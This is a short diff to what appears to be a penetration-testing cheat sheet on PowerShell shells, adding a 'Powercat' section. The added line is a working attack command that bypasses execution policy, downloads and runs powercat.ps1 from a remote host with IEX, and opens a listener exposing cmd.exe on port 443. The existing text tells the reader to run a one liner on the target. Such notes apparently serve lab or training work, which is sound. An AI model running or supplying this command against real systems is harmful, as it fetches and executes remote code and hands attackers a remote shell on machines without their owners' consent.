@@ -1,6 +1,12 @@
-# Powershell
+# Powercat \| Powershell
 
-Powershell \(one liner\)
+## Powercat
+
+```bash
+powershell  -nop -exec bypass -c "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.119.189/powercat.ps1');powercat -l -p 443 -e cmd.exe"
+```
+
+## Powershell \(one liner\)
 
 Use a one liner on the TARGET:
 
